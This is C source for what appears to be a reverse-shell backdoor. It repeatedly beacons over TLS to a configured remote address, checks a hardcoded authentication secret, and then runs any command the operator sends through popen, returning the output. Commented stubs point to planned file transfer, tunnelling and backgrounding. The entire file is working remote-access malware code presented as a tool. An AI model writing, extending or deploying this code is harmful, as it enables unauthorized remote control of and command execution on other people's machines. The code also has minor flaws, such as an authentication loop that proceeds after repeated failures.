#include "server.h"

// Prototype functions
int resolveandconnect(int *, int8_t *, int);
SSL_CTX* initCTX(void);
int cmdshell(SSL *);
int entersession(SSL *, int *);
ssize_t ssl_readall(SSL *, uint8_t *, size_t, size_t *);
ssize_t ssl_writeall(SSL *, uint8_t *, size_t, size_t *);

int resolveandconnect(int *sockfd, int8_t *addr, int port) {
  int status;
  char portstr[6];
  int connected = 0;
  struct addrinfo hints, *serveraddr, *p;

  memset(&hints, 0, sizeof(hints));
  hints.ai_family = AF_UNSPEC;
  hints.ai_socktype = SOCK_STREAM;

  snprintf(portstr, 6,"%d", port);

  if ((status = getaddrinfo((char *)addr, portstr, &hints, &serveraddr)) != 0) {
    fprintf(stderr, "[-] ERROR: From getaddrinfo: %s\n", gai_strerror(status));
    return -1;
  }

  for(p = serveraddr; p != NULL; p = p->ai_next) {
    // Check to see if the addrsocket works
    if (((*sockfd) = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
      fprintf(stderr, "[~] WARN: Failed to acquire socket.\n");
      continue;
    }

    if (connect((*sockfd), p->ai_addr, p->ai_addrlen) < 0) {
      fprintf(stderr, "[~] WARN: Failed to bind.\n");
      continue;         
    }
    connected = 1;
    break;
  }

  freeaddrinfo(serveraddr);  // All done with the struct at this point

  if (connected == 0) {
    perror("[-] ERROR: Unable to connect.");
    return -1;
  }

  return 0;
}

SSL_CTX* initCTX(void) {
  SSL_CTX *ctx;
  const SSL_METHOD *method;

  OpenSSL_add_all_algorithms();       // Load & register all cryptos, etc.
  SSL_load_error_strings();           // Load all error messages
  method = TLS_client_method();       // Create new server-method instance
  ctx = SSL_CTX_new(method);          // Create new context from method
  if (ctx == NULL) {                  // Check for errors
    ERR_print_errors_fp(stderr);
    abort();
  }

  return ctx;
}

int cmdshell(SSL *ssl) {
  FILE *fp;
  int res;
  size_t total_sent = 0, total_read = 0;
  uint8_t buf[2048] = {0};

  fp = popen("date", "r");
  while (fgets((char *)buf, sizeof(buf), fp) != NULL) {
    ssl_writeall(ssl, buf, sizeof(buf), &total_sent);
  }
  pclose(fp);

  memset(buf, 0, sizeof(buf));
  while(ssl_readall(ssl, buf, sizeof(buf), &total_read) > 0) {
    fp = NULL;
    if ((res = strcmp((char *)buf, "exit\n")) == 0) {
      return 0;
    }

    if ((fp = popen((char *)buf, "r")) == NULL) {
      printf("Error?\n");
      continue;
    }

    while(fgets((char *)buf, sizeof(buf), fp) != NULL) {
      ssl_writeall(ssl, buf, sizeof(buf), &total_sent);
      printf("[*] We have sent a total of %ld bytes\n", total_sent);
      memset(buf, 0, sizeof(buf));
    }
    ssl_writeall(ssl, (uint8_t *)"", 1, &total_sent);

    memset(buf, 0, sizeof(buf));
    pclose(fp);
  }
  
  return 0;
}

int entersession(SSL *ssl, int *clientfd) {
  int count = 0, cmd, exit = 0, res;
  size_t total_sent = 0, total_read = 0;
  uint8_t buf[4096] = {0};
/*  struct timeval tv;

  tv.tv_sec = 5;
  tv.tv_usec = 500;
  if (setsockopt(*clientfd, SOL_SOCKET, SO_RCVTIMEO, (const void *)&tv, sizeof(struct timeval)) == -1) {
    perror("[-] ERROR: Failed to set socket timeout");
    return -1;
  }*/

  SSL_set_fd(ssl, *clientfd);                         // Attach the socket descriptor to the SSL conneciton state

  if ((exit = SSL_connect(ssl)) == FAILURE) {                  // Preform the SSL connection
    ERR_print_errors_fp(stderr);
    return -1;
  }

  SSL_set_mode(ssl, SSL_MODE_AUTO_RETRY);

  ssl_writeall(ssl, (uint8_t *)"10", 3, &total_sent);            // Message the client that we are ready to authenticate

  ssl_readall(ssl, buf, sizeof(buf), &total_read);    // Read the authentication secret into memory
  while ((res = strncmp((char *)buf, AUTH, strlen(AUTH)) != 0) && count < 3) {       // Keep checking to see if the sent auth message is gtg
    ssl_writeall(ssl, (uint8_t *)"50", 3, &total_sent);
    memset(buf, 0, sizeof(buf));
    ssl_readall(ssl, buf, sizeof(buf), &total_read);  // Read the newly passed auth string
    count++;
  }
  ssl_writeall(ssl, (uint8_t *)"10", 3, &total_sent);

  while(1) {
    memset(buf, 0, sizeof(buf));
    ssl_readall(ssl, buf, sizeof(buf), &total_read);

    cmd = atoi((char *)buf);
    switch (cmd) {
      case NEW:
        //newconn(ssl);
        break;
      case CMD:
        cmdshell(ssl);
        break;
      case GET:
        //getfile(ssl);
        break;
      case PUT:
        //putfile(ssl);
        break;
      case TUN:
        //tunnel(ssl);
        break;
      case WIN:
        //window(ssl);
        break;
      case BYE:
        goto cleanup;
      default:
        break;
    }
  }

  cleanup:
  return exit;
}

ssize_t ssl_readall(SSL *ssl, uint8_t *buf, size_t len, size_t *total_recv) {
    int r = 0;
    size_t recvd = 0;

    while (recvd < len) {
      r = SSL_read(ssl, &buf[recvd], len-recvd);
      if (r < 0) {
        perror("[-] ERROR: SSL_read encountered and error");
        break;
      } else if (r == 0) {
        break;
      } else {
        recvd += r;
        (*total_recv) += r;
        if (strcmp((char *)&buf[recvd-1], (char *)"\0") == 0) {
          break;
        }
      }
    }
    return r;
}

ssize_t ssl_writeall(SSL *ssl, uint8_t *msg, size_t len, size_t *total_sent) {
  int s = 0;
  size_t sent = 0;

  while (sent < len) {
    if ((s = SSL_write(ssl,  &msg[sent], len-sent)) < 0) {
      perror("[-] ERROR: SSL_write encountered an error");
      break;
    }
    (*total_sent) += s;
    sent += s;
  }

  return s;
}

int main(void) {
  int res;
  int time = 5;
  SSL_CTX *ctx;
  SSL *ssl;
  int clientfd;

  /* fork the program into the background
  if ((pid = fork()) < 0) {
    fprintf(stderr, "[-] Failed to fork to background.");
    return -1;
  }

  if (setsid() < 0) {
    perror("[-] ERROR: Socket issue");
    return -1;
  }
  */

  while (1) {
    SSL_library_init();
    ctx = initCTX();
    ssl = SSL_new(ctx);                             // Create new SSL connection state

    if ((res = resolveandconnect(&clientfd, (int8_t *)ADDR, PORT)) != 0) {
      fprintf(stderr, "[-] Failed to connect to client.\n");
      goto reset;
    }
    
    SSL_set_fd(ssl, clientfd);
    entersession(ssl, &clientfd);                    // Enter an actual session with the client

    SSL_free(ssl);                                  // Release connection state
    close(clientfd);                                // Close socket file descriptor
    SSL_CTX_free(ctx);                              // Release the SSL contex

    reset:
    sleep(time);                                    // Sleep for a specified amount of time before sending another probe.
  }

  return 0;
}